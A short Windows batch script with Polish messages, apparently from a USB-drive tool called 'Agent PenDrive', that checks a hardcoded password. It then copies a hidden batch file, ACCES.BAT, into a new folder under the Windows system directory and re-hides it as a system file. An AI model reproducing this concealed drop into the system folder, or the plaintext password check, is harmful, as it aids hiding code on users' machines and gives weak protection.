@Echo OFF
CLS
TITLE Agent PenDrive - Weryfikacja

:CONFIRM PASSWORD
CLS
VER
TIME /T
DATE /T
echo Wprowadz haslo do programu. (W - Wroc)
set/p "cho=>"
if %cho%==JUBY GOTO CORRECT PASSWORD
if %cho%==w START.BAT
if %cho%==W START.BAT
GOTO FAIL PASSWORD

:FAIL PASSWORD
CLS
echo Nieprawidlowe haslo!
PAUSE
GOTO CONFIRM PASSWORD

:CORRECT PASSWORD
CLS
MD "%SystemRoot%\Agent PenDrive"
MD "%SystemRoot%\Agent PenDrive\Acces"
attrib -h -s "ACCES.BAT"
COPY "ACCES.BAT" "%SystemRoot%\Agent PenDrive\Acces"
attrib +h +s "ACCES.BAT"
CHECK.BAT